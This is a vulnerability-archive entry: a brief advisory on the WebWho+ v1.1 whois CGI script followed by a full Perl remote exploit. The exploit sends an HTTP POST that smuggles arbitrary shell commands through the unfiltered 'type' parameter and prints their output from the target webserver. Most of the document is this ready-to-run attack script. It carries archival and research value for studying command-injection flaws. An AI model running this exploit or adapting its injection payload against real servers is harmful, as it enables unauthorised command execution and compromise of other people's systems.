source: http://www.securityfocus.com/bid/892/info

WebWho+ is a free cgi script written by Tony Greenwood for executing whois queries via the www. Though it does perform checks for shell escape characters on some parameters, it misses the 'type' variable and allows for malicious input to be sent to a shell. It is possible to execute arbitrary commands on a webserver running WebWho+ v1.1 with the uid of the webserver (usually nobody). 

#!/usr/bin/perl
#
# hhp-webwho.pl
# WebWho+ v1.1 (whois cgi) remote exploit.
#
# By: loophole of hhp.
# [12/26/99]
#
# http://hhp.perlx.com/
# loophole@hhp.perlx.com
#
# Advisrory: http://hhp.perlx.com/ouradvisories/hhp-webwho.txt

use IO::Socket;

if (@ARGV < 2)
 {
  print "* hhp-webwho.pl\n";
  print "* webwho.pl (whois cgi) remote exploit.\n";
  print "* By: loophole of hhp.\n";
  print "* loophole\@hhp.perlx.com\n";
  print "* http://hhp.perlx.com/\n\n";
  print "USAGE: $0 <Server> [-e <File Extention>] <Command>\n\n";
  print "* Server         = www.example.com\n";
  print "* File Extension = /cgi-bin/webwho.pl\n";
  print "* Command        = Shell command\n\n";
  print "* NOTE: Defualt <File Extension> is /cgi-bin/webwho.pl\n";
  print "*       It only needs changing if it is not the defualt.\n\n";
  print "* EXAMPLE: $0 www.gat.org id\n";
  print "*      OR: $0 www.gat.org -e /jack/webwho.pl id\n";
  exit 0;
 }

if ($ARGV[1] eq "-e")
 {
  if (@ARGV != 4)
   {
    print "Invalid Usage!\n";
    exit 0;
   }
  $server     = $ARGV[0];
  $saywhatnig = $ARGV[2];
  $command    = $ARGV[3];
 }
  else
   {
    if (@ARGV == 2)
     {
      $server     = $ARGV[0];
      $command    = $ARGV[1];
      $saywhatnig = "/cgi-bin/webwho.pl";
     }
   }

$sock = IO::Socket::INET->new(PeerAddr => $server,
                              PeerPort => 80,
                                 Proto => "tcp") or die "Wack connection.\n";

$calkuhlashun = 45 + length($command);

  print $sock "POST $saywhatnig HTTP/1.1\n";
  print $sock "Accept-Language: en-us\n";
  print $sock "Host: $server\n";
  print $sock "Content-Length: $calkuhlashun\n";
  print $sock "Connection: Keep-Alive\n\n";
  print $sock 'command=X&type=";echo fukk;';
  print $sock "$command";
  print $sock ";echo fokk&Check=X\n";
  $doot = 0;

  while(<$sock>)
   {
    s/\n//g;
    s/fukk<br>/--------Exploit Stats------------/;
    s/fokk<br>/-hhpfoelife-\n/;
    s/<br>//g;
    $foo = $_;

     if ($foo =~ /---Ex/)
      {
       $doot = 1;
      }

     if ($foo =~ /-hhpfoelife-/)
      {
       $doot = 0;
       print "---------------------------------\n";
       exit 0;
      }

     if ($doot == 1) 
      {
       print "$foo\n";
      }  
   }
exit 0;